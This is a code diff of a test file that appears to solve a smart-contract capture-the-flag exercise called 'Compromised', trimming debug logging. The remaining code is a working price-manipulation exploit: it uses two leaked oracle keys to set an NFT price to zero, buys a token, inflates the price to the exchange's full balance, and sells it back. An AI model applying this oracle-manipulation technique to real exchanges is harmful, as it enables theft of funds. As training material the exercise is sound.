@@ -69,30 +69,20 @@ describe('Compromised challenge', function () {
         let compromisedOracle1 = new ethers.Wallet(privateKey1, ethers.provider);
         let compromisedOracle2 = new ethers.Wallet(privateKey2, ethers.provider);
 
-        let priceBefore = ethers.BigNumber.from(await this.oracle.connect(compromisedOracle1).getMedianPrice("DVNFT"));
-        console.log("Price before: " + priceBefore);
-
         // Set price to 0 by the 2 compromised oracle then buy low, sell high
         await this.oracle.connect(compromisedOracle1).postPrice("DVNFT", ethers.utils.parseEther("0"));
         await this.oracle.connect(compromisedOracle2).postPrice("DVNFT", ethers.utils.parseEther("0"));
 
-        let priceAfter = ethers.BigNumber.from(await this.oracle.connect(compromisedOracle1).getMedianPrice("DVNFT"));
-        console.log("Price after: " + priceAfter);
-
         const tx = await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther("0.01") });
 
         await this.exchange.on("TokenBought", async (sender, tokenId, currentPriceInWei) => {
-            console.log("Token id is :" + tokenId);
-
             await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
+
             await this.oracle.connect(compromisedOracle1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
             await this.oracle.connect(compromisedOracle2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
-            let nft = await this.nftToken.connect(attacker).balanceOf(attacker.address);
-            console.log("Number of nft's owned by attacker: " + nft);
+
             await this.exchange.connect(attacker).sellOne(tokenId);
 
-            let after = ethers.BigNumber.from(await this.oracle.connect(compromisedOracle1).getMedianPrice("DVNFT"));
-            console.log("After Price: " + after);
             await this.oracle.connect(compromisedOracle1).postPrice("DVNFT", INITIAL_NFT_PRICE);
             await this.oracle.connect(compromisedOracle2).postPrice("DVNFT", INITIAL_NFT_PRICE);
         });
